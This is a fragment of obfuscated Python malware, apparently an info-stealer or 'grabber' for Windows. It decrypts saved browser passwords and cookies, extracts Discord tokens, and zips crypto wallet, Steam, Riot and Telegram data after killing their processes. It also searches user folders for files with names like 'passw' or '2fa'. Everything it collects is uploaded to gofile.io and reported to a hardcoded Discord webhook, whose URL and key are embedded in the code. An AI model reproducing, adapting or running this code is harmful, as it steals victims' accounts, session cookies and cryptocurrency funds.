        OO0OOO0O0OO00OO00 =' | '.join (O0OO0000000O00O0O for O0OO0000000O00O0O in paswWords )#line:439
        if len (OO0OOO0O0OO00OO00 )>1000 :#line:440
            OO0OO000O0O00O00O =R4f0rm3t (str (paswWords ))#line:441
            OO0OOO0O0OO00OO00 =' | '.join (OO00OOO0O0O0O0OO0 for OO00OOO0O0O0O0OO0 in OO0OO000O0O00O00O )#line:442
        O00O0000OO0O0O0O0 ={"content":f"{globalInfo()}","embeds":[{"title":"unknown | Password Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{OO0OOO0O0OO00OO00}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [unknownPassword.txt]({OOOO0OO0O0O00000O})","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:460
        L04durl1b (keyfast67f ,data =dumps (O00O0000OO0O0O0O0 ).encode (),headers =OOO0OO00000O0OOOO )#line:461
        return #line:462
    if OOO000OOO0OOOOO0O =="kiwi":#line:464
        O00O0000OO0O0O0O0 ={"content":f"{globalInfo()}","embeds":[{"color":2895667 ,"fields":[{"name":"Interesting files found on user PC:","value":OOOO0OO0O0O00000O }],"author":{"name":"unknown | File Stealer"},"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:488
        L04durl1b (keyfast67f ,data =dumps (O00O0000OO0O0O0O0 ).encode (),headers =OOO0OO00000O0OOOO )#line:489
        return #line:490
    _ #line:503
def wr1tef0rf1l3 (O0O0000OO000OOO0O ,O0O0O0O0O0OO0O0OO ):#line:508
    O0000O0O00000O00O =os .getenv ("TEMP")+f"\cr{O0O0O0O0O0OO0O0OO}.txt"#line:509
    with open (O0000O0O00000O00O ,mode ='w',encoding ='utf-8')as OO0O00O00OOO0000O :#line:510
        OO0O00O00OOO0000O .write (f"<--unknown BEST -->\n\n")#line:511
        for OO00O0OO0OO000OOO in O0O0000OO000OOO0O :#line:512
            if OO00O0OO0OO000OOO [0 ]!='':#line:513
                OO0O00O00OOO0000O .write (f"{OO00O0OO0OO000OOO}\n")#line:514
T0k3ns =''#line:516
def getT0k3n (O0000O00O0O00O0OO ,O00000OO00OOOOOOO ):#line:517
    if not os .path .exists (O0000O00O0O00O0OO ):return #line:518
    O0000O00O0O00O0OO +=O00000OO00OOOOOOO #line:520
    for OOOOO000O0O0O00OO in os .listdir (O0000O00O0O00O0OO ):#line:521
        if OOOOO000O0O0O00OO .endswith (".log")or OOOOO000O0O0O00OO .endswith (".ldb"):#line:522
            for OO00O00OO00OO0000 in [O00O000OOOOOO0OOO .strip ()for O00O000OOOOOO0OOO in open (f"{O0000O00O0O00O0OO}\\{OOOOO000O0O0O00OO}",errors ="ignore").readlines ()if O00O000OOOOOO0OOO .strip ()]:#line:523
                for OOOOOO00O0OOOO0OO in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",r"mfa\.[\w-]{80,95}"):#line:524
                    for O0O0O0O0O000OO000 in re .findall (OOOOOO00O0OOOO0OO ,OO00O00OO00OO0000 ):#line:525
                        global T0k3ns #line:526
                        if ch1ckT4k1n (O0O0O0O0O000OO000 ):#line:527
                            if not O0O0O0O0O000OO000 in T0k3ns :#line:528
                                T0k3ns +=O0O0O0O0O000OO000 #line:530
                                upl05dT4k31 (O0O0O0O0O000OO000 ,O0000O00O0O00O0OO )#line:531
P4ssw =[]#line:533
def getP4ssw (O00000OO0000O0000 ,OOOO00OO0OOOO0O00 ):#line:534
    global P4ssw ,P4sswCount #line:535
    if not os .path .exists (O00000OO0000O0000 ):return #line:536
    O0O0OO00O00OO0000 =O00000OO0000O0000 +OOOO00OO0OOOO0O00 +"/Login Data"#line:538
    if os .stat (O0O0OO00O00OO0000 ).st_size ==0 :return #line:539
    OOO000O00O0O0O00O =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for OOOO0000O0000O0OO in range (8 ))+".db"#line:541
    shutil .copy2 (O0O0OO00O00OO0000 ,OOO000O00O0O0O00O )#line:543
    OO00OO0000OOOOOOO =sql_connect (OOO000O00O0O0O00O )#line:544
    O000OO00OOOOO0000 =OO00OO0000OOOOOOO .cursor ()#line:545
    O000OO00OOOOO0000 .execute ("SELECT action_url, username_value, password_value FROM logins;")#line:546
    O0OOO0O00O0O000OO =O000OO00OOOOO0000 .fetchall ()#line:547
    O000OO00OOOOO0000 .close ()#line:548
    OO00OO0000OOOOOOO .close ()#line:549
    os .remove (OOO000O00O0O0O00O )#line:550
    OO0OOOO00000O00O0 =O00000OO0000O0000 +"/Local State"#line:552
    with open (OO0OOOO00000O00O0 ,'r',encoding ='utf-8')as O0000O0OO0000O0O0 :O0O000O0OOO0OOOO0 =json_loads (O0000O0OO0000O0O0 .read ())#line:553
    OO00OO00OOO0O000O =b64decode (O0O000O0OOO0OOOO0 ['os_crypt']['encrypted_key'])#line:554
    OO00OO00OOO0O000O =CryptUnprotectData (OO00OO00OOO0O000O [5 :])#line:555
    for OO0OOOOO00OOOO0OO in O0OOO0O00O0O000OO :#line:557
        if OO0OOOOO00OOOO0OO [0 ]!='':#line:558
            for O00O000O00OO0OOO0 in keyword :#line:559
                OO00OO000O0OOO000 =O00O000O00OO0OOO0 #line:560
                if "https"in O00O000O00OO0OOO0 :#line:561
                    O0O0OOOO0OOO0OO00 =O00O000O00OO0OOO0 #line:562
                    O00O000O00OO0OOO0 =O0O0OOOO0OOO0OO00 .split ('[')[1 ].split (']')[0 ]#line:563
                if O00O000O00OO0OOO0 in OO0OOOOO00OOOO0OO [0 ]:#line:564
                    if not OO00OO000O0OOO000 in paswWords :paswWords .append (OO00OO000O0OOO000 )#line:565
            P4ssw .append (f"UR1: {OO0OOOOO00OOOO0OO[0]} | U53RN4M3: {OO0OOOOO00OOOO0OO[1]} | P455W0RD: {D3kryptV4lU3(OO0OOOOO00OOOO0OO[2], OO00OO00OOO0O000O)}")#line:566
            P4sswCount +=1 #line:567
    wr1tef0rf1l3 (P4ssw ,'passw')#line:568
C00k13 =[]#line:570
def getC00k13 (O0O0O0O00OOOOO000 ,OOOOO00OO0O0OO000 ):#line:571
    global C00k13 ,CookiCount #line:572
    if not os .path .exists (O0O0O0O00OOOOO000 ):return #line:573
    O00O0OOOOO0000000 =O0O0O0O00OOOOO000 +OOOOO00OO0O0OO000 +"/Cookies"#line:575
    if os .stat (O00O0OOOOO0000000 ).st_size ==0 :return #line:576
    O000000OOO00O0OO0 =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for O0OO0OOO000O0O0O0 in range (8 ))+".db"#line:578
    shutil .copy2 (O00O0OOOOO0000000 ,O000000OOO00O0OO0 )#line:580
    O0O00OO0OOOO0OO00 =sql_connect (O000000OOO00O0OO0 )#line:581
    O0000O0O0O00O0O00 =O0O00OO0OOOO0OO00 .cursor ()#line:582
    O0000O0O0O00O0O00 .execute ("SELECT host_key, name, encrypted_value FROM cookies")#line:583
    O0O0OO0000OO0O000 =O0000O0O0O00O0O00 .fetchall ()#line:584
    O0000O0O0O00O0O00 .close ()#line:585
    O0O00OO0OOOO0OO00 .close ()#line:586
    os .remove (O000000OOO00O0OO0 )#line:587
    OO000OOOO00O00O00 =O0O0O0O00OOOOO000 +"/Local State"#line:589
    with open (OO000OOOO00O00O00 ,'r',encoding ='utf-8')as OO000OOOOO0OOOOOO :OOOO0OO0OOO000O0O =json_loads (OO000OOOOO0OOOOOO .read ())#line:591
    O0OO00O000O000OOO =b64decode (OOOO0OO0OOO000O0O ['os_crypt']['encrypted_key'])#line:592
    O0OO00O000O000OOO =CryptUnprotectData (O0OO00O000O000OOO [5 :])#line:593
    for O00OO0OOOOOO0OOO0 in O0O0OO0000OO0O000 :#line:595
        if O00OO0OOOOOO0OOO0 [0 ]!='':#line:596
            for O000O0OOOOOOO00OO in keyword :#line:597
                O0O000O0000O000O0 =O000O0OOOOOOO00OO #line:598
                if "https"in O000O0OOOOOOO00OO :#line:599
                    OOO00O0O0OOOOO000 =O000O0OOOOOOO00OO #line:600
                    O000O0OOOOOOO00OO =OOO00O0O0OOOOO000 .split ('[')[1 ].split (']')[0 ]#line:601
                if O000O0OOOOOOO00OO in O00OO0OOOOOO0OOO0 [0 ]:#line:602
                    if not O0O000O0000O000O0 in cookiWords :cookiWords .append (O0O000O0000O000O0 )#line:603
            C00k13 .append (f"{O00OO0OOOOOO0OOO0[0]}	TRUE	/	FALSE	2597573456	{O00OO0OOOOOO0OOO0[1]}	{D3kryptV4lU3(O00OO0OOOOOO0OOO0[2], O0OO00O000O000OOO)}")#line:604
            CookiCount +=1 #line:605
    wr1tef0rf1l3 (C00k13 ,'cook')#line:606
def G3tD1sc0rd (O000OO0OOOO0000O0 ,O0OO000OO0O00OOOO ):#line:608
    if not os .path .exists (f"{O000OO0OOOO0000O0}/Local State"):return #line:609
    OOO00O000O00O00O0 =O000OO0OOOO0000O0 +O0OO000OO0O00OOOO #line:611
    O0OOO0000OOO0OO0O =O000OO0OOOO0000O0 +"/Local State"#line:613
    with open (O0OOO0000OOO0OO0O ,'r',encoding ='utf-8')as OOO0O0O000O0O0OOO :OO00OOO0O0OO0OO0O =json_loads (OOO0O0O000O0O0OOO .read ())#line:614
    O0OO0OOOO00O0O0O0 =b64decode (OO00OOO0O0OO0OO0O ['os_crypt']['encrypted_key'])#line:615
    O0OO0OOOO00O0O0O0 =CryptUnprotectData (O0OO0OOOO00O0O0O0 [5 :])#line:616
    for O00O0O0O0OO00O00O in os .listdir (OOO00O000O00O00O0 ):#line:619
        if O00O0O0O0OO00O00O .endswith (".log")or O00O0O0O0OO00O00O .endswith (".ldb"):#line:621
            for OOOOOOO00OOOOOO00 in [O0OOO0OO00O0OOO0O .strip ()for O0OOO0OO00O0OOO0O in open (f"{OOO00O000O00O00O0}\\{O00O0O0O0OO00O00O}",errors ="ignore").readlines ()if O0OOO0OO00O0OOO0O .strip ()]:#line:622
                for OO000OO00OOO0OO00 in re .findall (r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",OOOOOOO00OOOOOO00 ):#line:623
                    global T0k3ns #line:624
                    O0000O0OOO00OO0OO =D3kryptV4lU3 (b64decode (OO000OO00OOO0OO00 .split ('dQw4w9WgXcQ:')[1 ]),O0OO0OOOO00O0O0O0 )#line:625
                    if ch1ckT4k1n (O0000O0OOO00OO0OO ):#line:626
                        if not O0000O0OOO00OO0OO in T0k3ns :#line:627
                            T0k3ns +=O0000O0OOO00OO0OO #line:629
                            upl05dT4k31 (O0000O0OOO00OO0OO ,O000OO0OOOO0000O0 )#line:631
def GatherZips (OO00OOOO00OO0O0OO ,O0O0OOOO0OOOOO000 ,OO0000O0O0OO000O0 ):#line:633
    OO0OOOOO0000OOO00 =[]#line:634
    for OOOO0O0OOO0OOOO00 in OO00OOOO00OO0O0OO :#line:635
        O00000OOO00O0OOOO =threading .Thread (target =Z1pTh1ngs ,args =[OOOO0O0OOO0OOOO00 [0 ],OOOO0O0OOO0OOOO00 [5 ],OOOO0O0OOO0OOOO00 [1 ]])#line:636
        O00000OOO00O0OOOO .start ()#line:637
        OO0OOOOO0000OOO00 .append (O00000OOO00O0OOOO )#line:638
    for OOOO0O0OOO0OOOO00 in O0O0OOOO0OOOOO000 :#line:640
        O00000OOO00O0OOOO =threading .Thread (target =Z1pTh1ngs ,args =[OOOO0O0OOO0OOOO00 [0 ],OOOO0O0OOO0OOOO00 [2 ],OOOO0O0OOO0OOOO00 [1 ]])#line:641
        O00000OOO00O0OOOO .start ()#line:642
        OO0OOOOO0000OOO00 .append (O00000OOO00O0OOOO )#line:643
    O00000OOO00O0OOOO =threading .Thread (target =ZipTelegram ,args =[OO0000O0O0OO000O0 [0 ],OO0000O0O0OO000O0 [2 ],OO0000O0O0OO000O0 [1 ]])#line:645
    O00000OOO00O0OOOO .start ()#line:646
    OO0OOOOO0000OOO00 .append (O00000OOO00O0OOOO )#line:647
    for OO000OO000OO0000O in OO0OOOOO0000OOO00 :#line:649
        OO000OO000OO0000O .join ()#line:650
    global WalletsZip ,GamingZip ,OtherZip #line:651
    OO0OOO000OOO000O0 ,O0O0OO00O0O0OO0O0 ,OOO00O0O00OO0OOOO ="",'',''#line:654
    if not len (WalletsZip )==0 :#line:655
        OO0OOO000OOO000O0 =":coin:  •  Wallets\n"#line:656
        for OOOO0OO0O0OOOOO0O in WalletsZip :#line:657
            OO0OOO000OOO000O0 +=f"└─ [{OOOO0OO0O0OOOOO0O[0]}]({OOOO0OO0O0OOOOO0O[1]})\n"#line:658
    if not len (WalletsZip )==0 :#line:659
        O0O0OO00O0O0OO0O0 =":video_game:  •  Gaming:\n"#line:660
        for OOOO0OO0O0OOOOO0O in GamingZip :#line:661
            O0O0OO00O0O0OO0O0 +=f"└─ [{OOOO0OO0O0OOOOO0O[0]}]({OOOO0OO0O0OOOOO0O[1]})\n"#line:662
    if not len (OtherZip )==0 :#line:663
        OOO00O0O00OO0OOOO =":tickets:  •  Apps\n"#line:664
        for OOOO0OO0O0OOOOO0O in OtherZip :#line:665
            OOO00O0O00OO0OOOO +=f"└─ [{OOOO0OO0O0OOOOO0O[0]}]({OOOO0OO0O0OOOOO0O[1]})\n"#line:666
    OO0O00O0O0OO00OOO ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:670
    O0O0O00OOO000OO0O ={"content":globalInfo (),"embeds":[{"title":"unknown Zips","description":f"{OO0OOO000OOO000O0}\n{O0O0OO00O0O0OO0O0}\n{OOO00O0O00OO0OOOO}","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:688
    L04durl1b (keyfast67f ,data =dumps (O0O0O00OOO000OO0O ).encode (),headers =OO0O00O0O0OO00OOO )#line:689
def ZipTelegram (O00OO00OOO0000OO0 ,O0O00000OO000000O ,O0O0O0000OOO00OOO ):#line:692
    global OtherZip #line:693
    OO0O00O00OOO0OOO0 =O00OO00OOO0000OO0 #line:694
    OOOO00OOO0000000O =O0O00000OO000000O #line:695
    if not os .path .exists (OO0O00O00OOO0OOO0 ):return #line:696
    subprocess .Popen (f"taskkill /im {O0O0O0000OOO00OOO} /t /f >nul 2>&1",shell =True )#line:697
    OO0OOOOOO0000OO00 =ZipFile (f"{OO0O00O00OOO0OOO0}/{OOOO00OOO0000000O}.zip","w")#line:699
    for OO0O0O00O0OO00000 in os .listdir (OO0O00O00OOO0OOO0 ):#line:700
        if not ".zip"in OO0O0O00O0OO00000 and not "tdummy"in OO0O0O00O0OO00000 and not "user_data"in OO0O0O00O0OO00000 and not "webview"in OO0O0O00O0OO00000 :#line:701
            OO0OOOOOO0000OO00 .write (OO0O00O00OOO0OOO0 +"/"+OO0O0O00O0OO00000 )#line:702
    OO0OOOOOO0000OO00 .close ()#line:703
    OO00O00O00000O0O0 =uploadToAnonfiles (f'{OO0O00O00OOO0OOO0}/{OOOO00OOO0000000O}.zip')#line:705
    os .remove (f"{OO0O00O00OOO0OOO0}/{OOOO00OOO0000000O}.zip")#line:706
    OtherZip .append ([O0O00000OO000000O ,OO00O00O00000O0O0 ])#line:707
def Z1pTh1ngs (OOO0OO000OO00O0OO ,OOOO0O0OOOOO0O00O ,OOOO00OO0O00O00O0 ):#line:709
    O00O0O00O000OO000 =OOO0OO000OO00O0OO #line:710
    OO0OO00O00O0O0O00 =OOOO0O0OOOOO0O00O #line:711
    global WalletsZip ,GamingZip ,OtherZip #line:712
    if "nkbihfbeogaeaoehlefnkodbefgpgknn"in OOOO0O0OOOOO0O00O :#line:714
        OO0O00000OOO000OO =OOO0OO000OO00O0OO .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:715
        OO0OO00O00O0O0O00 =f"Metamask_{OO0O00000OOO000OO}"#line:716
        O00O0O00O000OO000 =OOO0OO000OO00O0OO +OOOO0O0OOOOO0O00O #line:717
    if not os .path .exists (O00O0O00O000OO000 ):return #line:719
    subprocess .Popen (f"taskkill /im {OOOO00OO0O00O00O0} /t /f >nul 2>&1",shell =True )#line:720
    if "Wallet"in OOOO0O0OOOOO0O00O or "NationsGlory"in OOOO0O0OOOOO0O00O :#line:722
        OO0O00000OOO000OO =OOO0OO000OO00O0OO .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:723
        OO0OO00O00O0O0O00 =f"{OO0O00000OOO000OO}"#line:724
    elif "Steam"in OOOO0O0OOOOO0O00O :#line:726
        if not os .path .isfile (f"{O00O0O00O000OO000}/loginusers.vdf"):return #line:727
        OO0O0OO0000OOO0O0 =open (f"{O00O0O00O000OO000}/loginusers.vdf","r+",encoding ="utf8")#line:728
        O0OOOO000000O0O00 =OO0O0OO0000OOO0O0 .readlines ()#line:729
        OO000OO00OO00OO00 =False #line:730
        for OOOOO00O0O0000O00 in O0OOOO000000O0O00 :#line:731
            if 'RememberPassword"\t\t"1"'in OOOOO00O0O0000O00 :#line:732
                OO000OO00OO00OO00 =True #line:733
        if OO000OO00OO00OO00 ==False :return #line:734
        OO0OO00O00O0O0O00 =OOOO0O0OOOOO0O00O #line:735
    OOOOO000000O0OO0O =ZipFile (f"{O00O0O00O000OO000}/{OO0OO00O00O0O0O00}.zip","w")#line:738
    for OOOOOOOO00OO00O00 in os .listdir (O00O0O00O000OO000 ):#line:739
        if not ".zip"in OOOOOOOO00OO00O00 :OOOOO000000O0OO0O .write (O00O0O00O000OO000 +"/"+OOOOOOOO00OO00O00 )#line:740
    OOOOO000000O0OO0O .close ()#line:741
    OO00O0OO000OO0000 =uploadToAnonfiles (f'{O00O0O00O000OO000}/{OO0OO00O00O0O0O00}.zip')#line:743
    os .remove (f"{O00O0O00O000OO000}/{OO0OO00O00O0O0O00}.zip")#line:744
    if "Wallet"in OOOO0O0OOOOO0O00O or "eogaeaoehlef"in OOOO0O0OOOOO0O00O :#line:746
        WalletsZip .append ([OO0OO00O00O0O0O00 ,OO00O0OO000OO0000 ])#line:747
    elif "NationsGlory"in OO0OO00O00O0O0O00 or "Steam"in OO0OO00O00O0O0O00 or "RiotCli"in OO0OO00O00O0O0O00 :#line:748
        GamingZip .append ([OO0OO00O00O0O0O00 ,OO00O0OO000OO0000 ])#line:749
    else :#line:750
        OtherZip .append ([OO0OO00O00O0O0O00 ,OO00O0OO000OO0000 ])#line:751
def GatherAll ():#line:754
    ""#line:755
    O0O0OO0O0O0000O00 =[[f"{roaming}/Opera Software/Opera GX Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Neon/User Data/Default","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome SxS/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/BraveSoftware/Brave-Browser/User Data","brave.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Yandex/YandexBrowser/User Data","yandex.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Microsoft/Edge/User Data","edge.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]]#line:765
    OOOO0OO0000O00O0O =[[f"{roaming}/Discord","/Local Storage/leveldb"],[f"{roaming}/Lightcord","/Local Storage/leveldb"],[f"{roaming}/discordcanary","/Local Storage/leveldb"],[f"{roaming}/discordptb","/Local Storage/leveldb"],]#line:772
    OOO0OOOOOOOO0OO0O =[[f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',"Wallet"],[f"{roaming}/Exodus/exodus.wallet","Exodus.exe","Wallet"],["C:\Program Files (x86)\Steam\config","steam.exe","Steam"],[f"{roaming}/NationsGlory/Local Storage/leveldb","NationsGlory.exe","NationsGlory"],[f"{local}/Riot Games/Riot Client/Data","RiotClientServices.exe","RiotClient"]]#line:780
    OOO000O0OO000O000 =[f"{roaming}/Telegram Desktop/tdata",'telegram.exe',"Telegram"]#line:781
    for O0OOO0O0OO0O0O0OO in O0O0OO0O0O0000O00 :#line:783
        OO0OOOOO0OOOO0OO0 =threading .Thread (target =getT0k3n ,args =[O0OOO0O0OO0O0O0OO [0 ],O0OOO0O0OO0O0O0OO [2 ]])#line:784
        OO0OOOOO0OOOO0OO0 .start ()#line:785
        Threadlist .append (OO0OOOOO0OOOO0OO0 )#line:786
    for O0OOO0O0OO0O0O0OO in OOOO0OO0000O00O0O :#line:787
        OO0OOOOO0OOOO0OO0 =threading .Thread (target =G3tD1sc0rd ,args =[O0OOO0O0OO0O0O0OO [0 ],O0OOO0O0OO0O0O0OO [1 ]])#line:788
        OO0OOOOO0OOOO0OO0 .start ()#line:789
        Threadlist .append (OO0OOOOO0OOOO0OO0 )#line:790
    for O0OOO0O0OO0O0O0OO in O0O0OO0O0O0000O00 :#line:792
        OO0OOOOO0OOOO0OO0 =threading .Thread (target =getP4ssw ,args =[O0OOO0O0OO0O0O0OO [0 ],O0OOO0O0OO0O0O0OO [3 ]])#line:793
        OO0OOOOO0OOOO0OO0 .start ()#line:794
        Threadlist .append (OO0OOOOO0OOOO0OO0 )#line:795
    O00OO00OOO0O0O00O =[]#line:797
    for O0OOO0O0OO0O0O0OO in O0O0OO0O0O0000O00 :#line:798
        OO0OOOOO0OOOO0OO0 =threading .Thread (target =getC00k13 ,args =[O0OOO0O0OO0O0O0OO [0 ],O0OOO0O0OO0O0O0OO [4 ]])#line:799
        OO0OOOOO0OOOO0OO0 .start ()#line:800
        O00OO00OOO0O0O00O .append (OO0OOOOO0OOOO0OO0 )#line:801
    threading .Thread (target =GatherZips ,args =[O0O0OO0O0O0000O00 ,OOO0OOOOOOOO0OO0O ,OOO000O0OO000O000 ]).start ()#line:803
    for O0OOOOOO000OOOOO0 in O00OO00OOO0O0O00O :O0OOOOOO000OOOOO0 .join ()#line:806
    O0OOOO0O0O0OOOO00 =TR6st (C00k13 )#line:807
    if O0OOOO0O0O0OOOO00 ==True :return #line:808
    for O0OOO0O0OO0O0O0OO in O0O0OO0O0O0000O00 :#line:810
         threading .Thread (target =Z1pTh1ngs ,args =[O0OOO0O0OO0O0O0OO [0 ],O0OOO0O0OO0O0O0OO [5 ],O0OOO0O0OO0O0O0OO [1 ]]).start ()#line:811
    for O0OOO0O0OO0O0O0OO in OOO0OOOOOOOO0OO0O :#line:813
         threading .Thread (target =Z1pTh1ngs ,args =[O0OOO0O0OO0O0O0OO [0 ],O0OOO0O0OO0O0O0OO [2 ],O0OOO0O0OO0O0O0OO [1 ]]).start ()#line:814
    threading .Thread (target =ZipTelegram ,args =[OOO000O0OO000O000 [0 ],OOO000O0OO000O000 [2 ],OOO000O0OO000O000 [1 ]]).start ()#line:816
    for O0OOOOOO000OOOOO0 in Threadlist :#line:818
        O0OOOOOO000OOOOO0 .join ()#line:819
    global upths #line:820
    upths =[]#line:821
    for O00OO0000O00OOO0O in ["crpassw.txt","crcook.txt"]:#line:823
        upload (O00OO0000O00OOO0O .replace (".txt",""),uploadToAnonfiles (os .getenv ("TEMP")+"\\"+O00OO0000O00OOO0O ))#line:825
def uploadToAnonfiles (O0O0000O0O00O0OO0 ):#line:827
    try :return requests .post (f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',files ={'file':open (O0O0000O0O00O0OO0 ,'rb')}).json ()["data"]["downloadPage"]#line:828
    except :return False #line:829
def KiwiFolder (OO0OO0OO0OOOOOO00 ,O000O00O0OOO0O0OO ):#line:831
    global KiwiFiles #line:832
    O0O0O000O00OO00OO =7 #line:833
    OOO0O0000OO0O0OO0 =0 #line:834
    OO00O0OOO00O000OO =os .listdir (OO0OO0OO0OOOOOO00 )#line:835
    O0O000O0000000000 =[]#line:836
    for OOOO000OOO00O000O in OO00O0OOO00O000OO :#line:837
        if not os .path .isfile (OO0OO0OO0OOOOOO00 +"/"+OOOO000OOO00O000O ):return #line:838
        OOO0O0000OO0O0OO0 +=1 #line:839
        if OOO0O0000OO0O0OO0 <=O0O0O000O00OO00OO :#line:840
            OOOOO00OOOOOO00OO =uploadToAnonfiles (OO0OO0OO0OOOOOO00 +"/"+OOOO000OOO00O000O )#line:841
            O0O000O0000000000 .append ([OO0OO0OO0OOOOOO00 +"/"+OOOO000OOO00O000O ,OOOOO00OOOOOO00OO ])#line:842
        else :#line:843
            break #line:844
    KiwiFiles .append (["folder",OO0OO0OO0OOOOOO00 +"/",O0O000O0000000000 ])#line:845
KiwiFiles =[]#line:847
def KiwiFile (O0O0O00O0O0O0OO00 ,O00OO000O000O0O00 ):#line:848
    global KiwiFiles #line:849
    OOOOO0OO00O00000O =[]#line:850
    OO0O0OO0O000O000O =os .listdir (O0O0O00O0O0O0OO00 )#line:851
    for OOO0OOOOO0O00O0OO in OO0O0OO0O000O000O :#line:852
        for O000OOO000O0O0OOO in O00OO000O000O0O00 :#line:853
            if O000OOO000O0O0OOO in OOO0OOOOO0O00O0OO .lower ():#line:854
                if os .path .isfile (O0O0O00O0O0O0OO00 +"/"+OOO0OOOOO0O00O0OO )and ".txt"in OOO0OOOOO0O00O0OO :#line:855
                    OOOOO0OO00O00000O .append ([O0O0O00O0O0O0OO00 +"/"+OOO0OOOOO0O00O0OO ,uploadToAnonfiles (O0O0O00O0O0O0OO00 +"/"+OOO0OOOOO0O00O0OO )])#line:856
                    break #line:857
                if os .path .isdir (O0O0O00O0O0O0OO00 +"/"+OOO0OOOOO0O00O0OO ):#line:858
                    OOOOOO000OO0OOOO0 =O0O0O00O0O0O0OO00 +"/"+OOO0OOOOO0O00O0OO #line:859
                    KiwiFolder (OOOOOO000OO0OOOO0 ,O00OO000O000O0O00 )#line:860
                    break #line:861
    KiwiFiles .append (["folder",O0O0O00O0O0O0OO00 ,OOOOO0OO00O00000O ])#line:863
def Kiwi ():#line:865
    OO0OO000OO00OOOOO =temp .split ("\AppData")[0 ]#line:866
    O00OOO00000000OOO =[OO0OO000OO00OOOOO +"/Desktop",OO0OO000OO00OOOOO +"/Downloads",OO0OO000OO00OOOOO +"/Documents"]#line:871
    OO0000O000O000O0O =["account","acount","passw","secret","senhas","contas","backup","2fa","importante","privado","exodus","exposed","perder","amigos","empresa","trabalho","work","private","source","users","username","login","user","usuario","log"]#line:899
    OOO0O0O00OO00OO00 =["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal","banque","account","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte","token","backup","secret","mom","family"]#line:927
    OO0OO000OO0OO0OOO =[]#line:929
    for OO00O00OO00O0OO00 in O00OOO00000000OOO :#line:930
        OOOOOOOO0O000000O =threading .Thread (target =KiwiFile ,args =[OO00O00OO00O0OO00 ,OOO0O0O00OO00OO00 ]);OOOOOOOO0O000000O .start ()#line:931
        OO0OO000OO0OO0OOO .append (OOOOOOOO0O000000O )#line:932
    return OO0OO000OO0OO0OOO #line:933
global keyword ,cookiWords ,paswWords ,CookiCount ,P4sswCount ,WalletsZip ,GamingZip ,OtherZip #line:936
keyword =['mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)']#line:940
CookiCount ,P4sswCount =0 ,0 #line:942
cookiWords =[]#line:943
paswWords =[]#line:944
WalletsZip =[]#line:946
GamingZip =[]#line:947
OtherZip =[]#line:948
key ='7c7PEK7NAArcPdSEdObVU35-3EMIa6KlomGD1E5e65ABXD6H1UbOaZ3OVdktOOzKHTH9'#line:950
todo ='1113432496969891941'#line:951
keyfast67f =f'https://discord.com/api/webhooks/{todo}/{key}'#line:952
GatherAll ()#line:954
DETECTED =TR6st (C00k13 )#line:955
if not DETECTED :#line:957
    wikith =Kiwi ()#line:958
    for thread in wikith :thread .join ()#line:960
    time .sleep (0.2 )#line:961
    filetext ="\n"#line:963
    for arg in KiwiFiles :#line:964
        if len (arg [2 ])!=0 :#line:965
            foldpath =arg [1 ]#line:966
            foldlist =arg [2 ]#line:967
            filetext +=f"📁 {foldpath}\n"#line:968
